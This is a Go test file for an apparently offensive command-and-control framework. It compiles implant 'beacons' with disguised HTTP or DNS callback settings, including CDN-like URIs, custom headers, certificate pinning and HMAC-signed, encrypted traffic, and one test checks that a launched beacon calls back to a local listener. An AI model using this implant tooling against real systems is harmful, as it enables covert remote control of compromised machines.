package main

import (
	"bufio"
	"bytes"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// TestBuildClient_EmbedsHTTPTransportConfig is the end-to-end check that a beacon
// built by Archon actually carries a transport configuration.
//
// It deliberately goes through the real buildClient rather than inspecting the
// generated source: a successful compile proves the generated config.go is valid
// Go using the Client module's real field names, and scanning the produced binary
// proves the values survived into the artefact an operator downloads.
func TestBuildClient_EmbedsHTTPTransportConfig(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping beacon compile in short mode")
	}

	// Distinctive values so a match in the binary cannot be a coincidence.
	const (
		hostMarker   = "listener-marker.example.net:8443"
		pinMarker    = "PINMARKERabcdefghijklmnopqrstuvwxyz012345"
		headerMarker = "nightfall-build-marker"
	)

	req := ClientBuildRequest{
		DNSDomains:   []string{"c2.example.com"},
		Platform:     "linux",
		Architecture: "amd64",
		SleepMin:     1,
		SleepMax:     2,
		BeaconName:   "httptest",
		Transport:    "dual",
		HTTPListeners: []HTTPListenerSpec{
			{
				Name:       "cdn-assets",
				Scheme:     "https",
				Host:       hostMarker,
				SPKISHA256: pinMarker,
				URIs: map[string][]string{
					"register": {"/api/v1/ping"},
					"task":     {"/api/v1/sync"},
					"result":   {"/api/v1/report"},
					"ack":      {"/api/v1/ack"},
				},
				Methods: map[string]string{
					"register": "POST",
					"task":     "GET",
					"result":   "POST",
					"ack":      "GET",
				},
				RequestHeaders: []HTTPHeaderSpec{
					{Name: "Host", Value: "{{host}}"},
					{Name: "X-Campaign", Value: headerMarker},
					{Name: "Content-Length", Value: "{{content_length}}", Operations: []string{"register", "result"}},
					{Name: "X-Sig", Value: "{{auth}}"},
				},
				Auth: map[string]interface{}{"mode": "hmac-sha256", "header": "X-Sig"},
			},
		},
		HTTPFallbackAfterFailures: 4,
		HTTPRetryBackoffSecs:      45,
	}

	// The Client source lives beside Archon in the repository root.
	sourceRoot, err := filepath.Abs("..")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(sourceRoot, "Client", "main.go")); err != nil {
		t.Skipf("Client source not available at %s: %v", sourceRoot, err)
	}

	binaryPath, err := buildClient(req, sourceRoot, "test-encryption-key-000000000000", "testbuild")
	if err != nil {
		t.Fatalf("buildClient() error = %v", err)
	}
	if binaryPath != "" {
		defer os.RemoveAll(filepath.Dir(binaryPath))
	}

	raw, err := os.ReadFile(binaryPath)
	if err != nil {
		t.Fatalf("failed to read the built binary: %v", err)
	}

	for name, want := range map[string]string{
		"transport mode":        "dual",
		"listener host":         hostMarker,
		"pinned SPKI":           pinMarker,
		"task URI":              "/api/v1/sync",
		"custom request header": headerMarker,
	} {
		if !bytes.Contains(raw, []byte(want)) {
			t.Errorf("built binary does not contain the %s (%q)", name, want)
		}
	}
}

func TestValidateClientBuildRequest_AllowsHTTPOnlyWithoutDNSDomains(t *testing.T) {
	req := ClientBuildRequest{
		Transport: "http",
		HTTPListeners: []HTTPListenerSpec{{
			Name: "edge",
			Host: "127.0.0.1:8443",
		}},
	}
	if err := validateClientBuildRequest(req); err != nil {
		t.Fatalf("HTTP-only build unexpectedly requires DNS: %v", err)
	}
}

func TestValidateClientBuildRequest_RequiresDNSForDNSAndDualModes(t *testing.T) {
	for _, mode := range []string{"", "dns", "dual"} {
		t.Run(mode, func(t *testing.T) {
			if err := validateClientBuildRequest(ClientBuildRequest{Transport: mode}); err == nil {
				t.Fatal("build without DNS domains was accepted")
			}
		})
	}
}

func TestBuildClient_HTTPOnlyBinaryCallsBackWithCustomHeaders(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping beacon process test in short mode")
	}

	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer listener.Close()

	captured := make(chan string, 1)
	serveErr := make(chan error, 1)
	go func() {
		conn, err := listener.Accept()
		if err != nil {
			serveErr <- err
			return
		}
		defer conn.Close()
		_ = conn.SetDeadline(time.Now().Add(10 * time.Second))

		reader := bufio.NewReader(conn)
		var lines []string
		for {
			line, err := reader.ReadString('\n')
			if err != nil {
				serveErr <- err
				return
			}
			line = strings.TrimSuffix(strings.TrimSuffix(line, "\n"), "\r")
			if line == "" {
				break
			}
			lines = append(lines, line)
		}

		if _, err := conn.Write([]byte("HTTP/1.1 204 No Content\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")); err != nil {
			serveErr <- err
			return
		}
		captured <- strings.Join(lines, "\n")
	}()

	sourceRoot, err := filepath.Abs("..")
	if err != nil {
		t.Fatal(err)
	}
	const marker = "process-callback-marker"
	req := ClientBuildRequest{
		DNSDomains:   nil,
		Platform:     "linux",
		Architecture: "amd64",
		SleepMin:     1,
		SleepMax:     1,
		BeaconName:   "http-process-test",
		Transport:    "http",
		HTTPListeners: []HTTPListenerSpec{{
			Name:   "process-listener",
			Scheme: "http",
			Host:   listener.Addr().String(),
			URIs: map[string][]string{
				"register": {"/api/v1/ping"},
				"task":     {"/api/v1/sync"},
				"result":   {"/api/v1/report"},
				"ack":      {"/api/v1/ack"},
			},
			Methods: map[string]string{
				"register": "POST", "task": "GET", "result": "POST", "ack": "GET",
			},
			RequestHeaders: []HTTPHeaderSpec{
				{Name: "X-Process-Test", Value: marker},
				{Name: "Host", Value: "{{host}}"},
				{Name: "Content-Type", Value: "application/json", Operations: []string{"register", "result"}},
				{Name: "Content-Length", Value: "{{content_length}}", Operations: []string{"register", "result"}},
				{Name: "X-Sig", Value: "{{auth}}"},
				{Name: "Connection", Value: "close"},
			},
			RequestBody:  map[string]interface{}{"encoding": "aes-gcm-base36", "field": "d"},
			ResponseBody: map[string]interface{}{"encoding": "aes-gcm-base36", "field": "d"},
			Auth:         map[string]interface{}{"mode": "hmac-sha256", "header": "X-Sig", "sig_encoding": "hex"},
			TimeoutSecs:  5,
		}},
	}

	binaryPath, err := buildClient(req, sourceRoot, "process-test-encryption-key", "processtest")
	if err != nil {
		t.Fatalf("buildClient() error = %v", err)
	}
	defer os.RemoveAll(filepath.Dir(binaryPath))

	command := exec.Command(binaryPath)
	if err := command.Start(); err != nil {
		t.Fatalf("failed to launch built beacon: %v", err)
	}
	defer func() {
		if command.Process != nil {
			_ = command.Process.Kill()
			_, _ = command.Process.Wait()
		}
	}()

	select {
	case request := <-captured:
		if !strings.HasPrefix(request, "POST /api/v1/ping HTTP/1.1\n") {
			t.Fatalf("first callback has the wrong request line:\n%s", request)
		}
		if !strings.Contains(request, "X-Process-Test: "+marker) {
			t.Fatalf("compiled beacon lost the custom header:\n%s", request)
		}
		if !strings.Contains(request, "X-Sig: ") {
			t.Fatalf("compiled beacon sent no authentication header:\n%s", request)
		}
	case err := <-serveErr:
		t.Fatalf("callback listener failed: %v", err)
	case <-time.After(12 * time.Second):
		t.Fatal("compiled HTTP-only beacon did not call back within 12 seconds")
	}
}

// TestBuildClient_DefaultsToDNS asserts a build request that does not mention a
// transport produces a DNS-mode beacon, so existing build flows are unaffected.
func TestBuildClient_DefaultsToDNS(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping beacon compile in short mode")
	}

	req := ClientBuildRequest{
		DNSDomains:   []string{"c2.example.com"},
		Platform:     "linux",
		Architecture: "amd64",
		SleepMin:     1,
		SleepMax:     2,
		BeaconName:   "dnstest",
	}

	sourceRoot, err := filepath.Abs("..")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(sourceRoot, "Client", "main.go")); err != nil {
		t.Skipf("Client source not available at %s: %v", sourceRoot, err)
	}

	binaryPath, err := buildClient(req, sourceRoot, "test-encryption-key-000000000000", "testbuild")
	if err != nil {
		t.Fatalf("buildClient() error = %v", err)
	}
	if binaryPath != "" {
		defer os.RemoveAll(filepath.Dir(binaryPath))
	}

	raw, err := os.ReadFile(binaryPath)
	if err != nil {
		t.Fatal(err)
	}

	// The embedded mode is the DNS default.
	if !bytes.Contains(raw, []byte("dns")) {
		t.Error("built binary does not carry the default dns transport mode")
	}

	// No listener list was embedded. Checking for the marshalled document rather
	// than a field name matters: Go keeps struct tag strings such as
	// json:"spki_sha256" in every binary's type metadata, so a field name is
	// present whether or not any listener was configured.
	if bytes.Contains(raw, []byte(`{"name":`)) {
		t.Error("a DNS-only build embedded an HTTP listener document")
	}
}
